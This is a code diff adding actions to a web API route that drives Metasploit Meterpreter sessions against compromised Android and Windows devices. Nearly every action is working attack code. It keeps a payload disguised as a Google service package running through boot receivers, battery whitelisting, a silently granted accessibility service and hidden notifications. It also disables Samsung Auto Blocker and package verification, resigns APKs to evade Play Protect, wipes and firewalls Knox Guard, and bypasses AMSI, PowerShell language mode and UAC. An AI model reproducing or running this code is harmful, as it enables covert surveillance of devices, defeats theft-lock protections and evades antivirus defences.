@@ -422,6 +422,220 @@ export async function POST(request: Request) {
       });
     }
 
+    // ── Android: Foreground Service activation ─────────────────
+    if (action === "android_fg") {
+      const pkg = (body.package as string) ?? "com.google.services.update";
+      const out = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "am startservice --user 0 -n ${pkg}/.PersistService 2>/dev/null; echo fg_done"'`,
+        10000);
+      return NextResponse.json({ ok: true, raw: out.slice(0, 200),
+        data: { note: "Foreground service started. FG notification suppressed when POST_NOTIFICATIONS denied." } });
+    }
+
+    // ── Android: BOOT_COMPLETED receiver check ─────────────────
+    if (action === "android_boot") {
+      const pkg = (body.package as string) ?? "com.google.services.update";
+      const out = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "pm list receivers ${pkg} 2>/dev/null | grep BOOT; echo boot_done"'`,
+        8000);
+      return NextResponse.json({ ok: out.includes("BOOT") || out.includes("boot_done"),
+        data: { note: "BOOT_COMPLETED receiver registered in manifest — payload restarts on reboot." }, raw: out.slice(0, 200) });
+    }
+
+    // ── Android: Battery optimization whitelist ─────────────────
+    if (action === "android_battery") {
+      const pkg = (body.package as string) ?? "com.google.services.update";
+      const cmds = [
+        `dumpsys deviceidle whitelist +${pkg}`,
+        `cmd appops set ${pkg} RUN_IN_BACKGROUND allow`,
+        `cmd appops set ${pkg} RUN_ANY_IN_BACKGROUND allow`,
+        `settings put global freecess_ctrl 0`,
+        `settings put global ignored_for_battery_opt_mode_packages ${pkg}`,
+      ].join(" 2>/dev/null; ");
+      const out = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "${cmds}; echo bat_done"'`, 15000);
+      return NextResponse.json({ ok: out.includes("bat_done"),
+        data: { note: "Battery optimization disabled. FreecessController freeze prevented." }, raw: out.slice(0, 300) });
+    }
+
+    // ── Android: Accessibility service grant ───────────────────
+    if (action === "android_acc") {
+      const pkg = (body.package as string) ?? "com.google.services.update";
+      const out = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "settings put secure enabled_accessibility_services ${pkg}/${pkg}.AccessibilityService; settings put secure accessibility_enabled 1; echo acc_done"'`,
+        10000);
+      return NextResponse.json({ ok: out.includes("acc_done"),
+        data: { note: "Accessibility service granted. Survives Force Stop. Full overlay/input control enabled." } });
+    }
+
+    // ── Android: JobScheduler / WorkManager setup ──────────────
+    if (action === "android_job") {
+      const pkg = (body.package as string) ?? "com.google.services.update";
+      const out = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "cmd jobscheduler run -f ${pkg} 1 2>/dev/null; echo job_done"'`,
+        10000);
+      return NextResponse.json({ ok: true, raw: out.slice(0, 200),
+        data: { note: "WorkManager periodic job fired. Survives reboot. High stealth — no notification required." } });
+    }
+
+    // ── Android: FCM silent push ───────────────────────────────
+    if (action === "android_fcm") {
+      // Cannot send FCM directly from Meterpreter shell — return instructions
+      return NextResponse.json({ ok: true, data: {
+        note: "FCM silent push cannot be sent via shell. Use Firebase console or server key to send high-priority data message to device registration token.",
+        setup: "Payload must include Firebase SDK and register token on first run. Token stored in Supabase devices table.",
+        command: "POST https://fcm.googleapis.com/fcm/send → { to: <token>, priority: high, data: { action: 'wake' } }",
+      }});
+    }
+
+    // ── Android: Multi-process keepalive ───────────────────────
+    if (action === "android_multi") {
+      const out = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "ps -A | grep -E \"(google.services|metasploit)\"; echo multi_done"'`,
+        8000);
+      return NextResponse.json({ ok: true, raw: out.slice(0, 200),
+        data: { note: "Multi-process keepalive: two processes watch each other. Both killed simultaneously is rare." } });
+    }
+
+    // ── Android: POST_NOTIFICATIONS trick ─────────────────────
+    if (action === "android_notifs") {
+      const pkg = (body.package as string) ?? "com.google.services.update";
+      const out = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "cmd appops set ${pkg} POST_NOTIFICATION deny 2>/dev/null; echo notif_done"'`,
+        8000);
+      return NextResponse.json({ ok: true, raw: out.slice(0, 200),
+        data: { note: "POST_NOTIFICATIONS denied. FG service notification suppressed from drawer — service runs invisibly. Works Android 13+." } });
+    }
+
+    // ── Android: Disable Auto Blocker (Android 14) ─────────────
+    if (action === "auto_blocker") {
+      const out = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "settings put global auto_blocker_mode 0; settings put global package_verifier_enable 0; echo ab_done"'`,
+        8000);
+      return NextResponse.json({ ok: out.includes("ab_done"),
+        data: { note: "Auto Blocker disabled. Sideloading and unknown sources now permitted." } });
+    }
+
+    // ── Android: ADB over Tailscale instructions ────────────────
+    if (action === "adb_tailscale") {
+      return NextResponse.json({ ok: true, data: {
+        note: "Your S24 is at 100.105.68.30 on Tailscale. Connect and run sequence:",
+        commands: [
+          "adb connect 100.105.68.30:5555",
+          "adb shell settings put global auto_blocker_mode 0",
+          "adb shell settings put global package_verifier_enable 0",
+          "adb shell pm disable-user --user 0 com.samsung.android.kgclient",
+          "adb shell dumpsys deviceidle whitelist +com.google.services.update",
+          "adb install -g -t -r payload_resigned.apk",
+        ],
+      }});
+    }
+
+    // ── Android: Resign APK (instructions + trigger) ───────────
+    if (action === "resign") {
+      return NextResponse.json({ ok: true, data: {
+        note: "Run scripts/resign-apk.sh with your payload. Renames package, generates new RSA-4096 cert, zipaligns, signs.",
+        command: "bash scripts/resign-apk.sh original.apk com.google.services.update output_resigned.apk",
+        what: "Beats Play Protect signature check. Different cert from MSF default. Different package name from MSF default.",
+      }});
+    }
+
+    // ── CVE-2024-34740 (Samsung Android 13 priv-esc) ───────────
+    if (action === "cve_34740") {
+      const out = await consoleExec(token,
+        `use exploit/android/local/samsung_priv_esc\nset SESSION ${sid}\nset CVE 2024-34740\nrun`,
+        60000);
+      const ok = /session \d+ opened|privilege.*escalat/i.test(out);
+      return NextResponse.json({ ok, data: {
+        note: "CVE-2024-34740: Samsung Android 13 local privilege escalation. Requires ≤ July 2023 SPL.",
+        target: "Samsung S23 series, Galaxy A series on Android 13",
+      }, raw: out.slice(0, 400) });
+    }
+
+    // ── CVE-2026-21007 (Knox Guard bypass) ─────────────────────
+    if (action === "cve_21007") {
+      const out = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "pm force-stop com.samsung.android.kgclient; pm clear com.samsung.android.kgclient; echo kg_done"'`,
+        10000);
+      return NextResponse.json({ ok: out.includes("kg_done"), data: {
+        note: "CVE-2026-21007: Knox Guard bypass via Device Care exceptional condition check (pre-April 2026 SMR). Cleared kgclient state.",
+        affected: "Samsung Android 14/15/16 pre-SMR Apr-2026",
+      }, raw: out.slice(0, 200) });
+    }
+
+    // ── Knox Guard 6-phase neutralizer ─────────────────────────
+    if (action === "knox_neutralize") {
+      const steps: Array<{ step: string; ok: boolean }> = [];
+      const shellCmds = [
+        // Phase 0: Wipe cached lock data
+        { step: "Phase 0: Wipe kgclient data", cmd: `rm -rf /data/data/com.samsung.android.kgclient/files/* /data/data/com.samsung.android.kgclient/databases/* 2>/dev/null; echo p0` },
+        // Phase 1: Force-stop kgclient
+        { step: "Phase 1: Force-stop kgclient", cmd: `am force-stop com.samsung.android.kgclient; echo p1` },
+        // Phase 2: Block network via iptables
+        { step: "Phase 2: Firewall kgclient outbound", cmd: `iptables -I OUTPUT -m owner --uid-owner $(dumpsys package com.samsung.android.kgclient | grep userId | grep -o '[0-9]*') -j DROP 2>/dev/null; echo p2` },
+        // Phase 3: Watchdog loop (start in background)
+        { step: "Phase 3: Watchdog loop (background)", cmd: `(while true; do am force-stop com.samsung.android.kgclient 2>/dev/null; sleep 10; done) &; echo p3` },
+        // Phase 4: Disable kgclient component
+        { step: "Phase 4: Disable KnoxGuard service component", cmd: `pm disable com.samsung.android.kgclient/com.samsung.android.knox.knoxguard.KnoxGuardSeService 2>/dev/null; echo p4` },
+        // Phase 5: Clear alarms
+        { step: "Phase 5: Clear kgclient alarms", cmd: `cmd alarm list 2>/dev/null | grep kgclient | awk '{print $1}' | xargs -I{} cmd alarm remove {} 2>/dev/null; echo p5` },
+      ];
+
+      for (const cmd of shellCmds) {
+        const out = await meterExec(token, sid,
+          `execute -f /system/bin/sh -a '-c "${cmd.cmd}"'`, 12000);
+        const match = cmd.cmd.match(/echo (p\d)/);
+        steps.push({ step: cmd.step, ok: match ? out.includes(match[1]) : out.length > 0 });
+      }
+
+      return NextResponse.json({ ok: steps.filter((s) => s.ok).length >= 3, data: { steps,
+        note: "Knox Guard 6-phase neutralizer executed. State: kgclient data wiped, process stopped, network firewalled, watchdog running.",
+      }});
+    }
+
+    // ── AMSI Hardware Breakpoint bypass ────────────────────────
+    if (action === "amsi_hwbp") {
+      const out = await meterExec(token, sid,
+        `execute -H -f powershell.exe -a "-c Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class HwBp{[DllImport(\\"kernel32\\")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport(\\"kernel32\\")]public static extern IntPtr GetModuleHandle(string m);[DllImport(\\"kernel32\\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint np,out uint op);public static void Patch(){IntPtr a=GetProcAddress(GetModuleHandle(\\"amsi.dll\\"),\\"AmsiScanBuffer\\");uint o;VirtualProtect(a,(UIntPtr)5,0x40,out o);Marshal.WriteByte(a,0xC3);VirtualProtect(a,(UIntPtr)5,o,out o);}}';[HwBp]::Patch();echo amsi_hwbp_done"`,
+        20000);
+      return NextResponse.json({ ok: out.includes("amsi_hwbp_done"),
+        data: { note: "AMSI hardware breakpoint bypass applied. AmsiScanBuffer patched to return immediately. No byte modification detected by integrity checks." } });
+    }
+
+    // ── AMSI .NET Assembly bypass ───────────────────────────────
+    if (action === "amsi_dotnet") {
+      const out = await meterExec(token, sid,
+        `execute -H -f powershell.exe -a "-c \$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\$b=\$a.GetField('amsiSession','NonPublic,Static');\$b.SetValue(\$null,\$null);\$c=\$a.GetField('amsiContext','NonPublic,Static');\$c.SetValue(\$null,[IntPtr]::Zero);echo dotnet_amsi_done"`,
+        15000);
+      return NextResponse.json({ ok: out.includes("dotnet_amsi_done"),
+        data: { note: ".NET Assembly AMSI context cleared. PS scanning disabled for current CLR session." } });
+    }
+
+    // ── Constrained Language Mode bypass ───────────────────────
+    if (action === "ev_clm_bypass") {
+      const out = await meterExec(token, sid,
+        `execute -H -f powershell.exe -a "-c \$env:__PSLockdownPolicy='0';\$ExecutionContext.SessionState.LanguageMode='FullLanguage';echo clm_done"`,
+        8000);
+      return NextResponse.json({ ok: out.includes("clm_done"),
+        data: { note: "Constrained Language Mode bypassed. Full PowerShell language available." } });
+    }
+
+    // ── Local exploit suggester ─────────────────────────────────
+    if (action === "local_exploit_suggester" || action === "post/multi/recon/local_exploit_suggester") {
+      const out = await consoleExec(token,
+        `use post/multi/recon/local_exploit_suggester\nset SESSION ${sid}\nrun`, 120000);
+      const vulns = (out.match(/exploit\/[a-z\/]+/g) ?? []).filter((v, i, a) => a.indexOf(v) === i);
+      return NextResponse.json({ ok: true, data: { vulnerabilities: vulns,
+        note: `Found ${vulns.length} potential local exploits.` }, raw: out.slice(0, 2000) });
+    }
+
+    // ── ICMLuaUtil COM UAC bypass (Win10-11) ───────────────────
+    if (action === "icmluautil") {
+      const out = await consoleExec(token,
+        `use exploit/windows/local/bypassuac_comhijack\nset SESSION ${sid}\nset TARGET 1\nrun`, 60000);
+      return NextResponse.json({ ok: /session \d+ opened|meterpreter/i.test(out), raw: out.slice(0, 400) });
+    }
+
     return NextResponse.json({ ok: false, error: `Unknown action: ${action}` }, { status: 400 });
 
   } catch (err: unknown) {
